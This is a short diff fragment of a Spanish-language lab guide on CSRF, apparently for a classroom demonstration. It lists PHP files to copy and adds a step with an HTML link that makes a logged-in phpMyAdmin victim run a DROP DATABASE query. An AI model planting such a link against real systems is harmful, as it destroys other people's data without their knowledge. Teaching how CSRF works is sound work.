@@ -56,4 +56,6 @@ En el caso de CSRF copiar los archivos;
 - index.php
 - agregar.php
 
+2.- Iniciar una sesion de phpmyadmin, en el pc victima y ejecutar
 
+<a href="http://[HOST]/phpmyadmin/sql.php?sql_query=DROP+DATABASE+[DBNAME]">
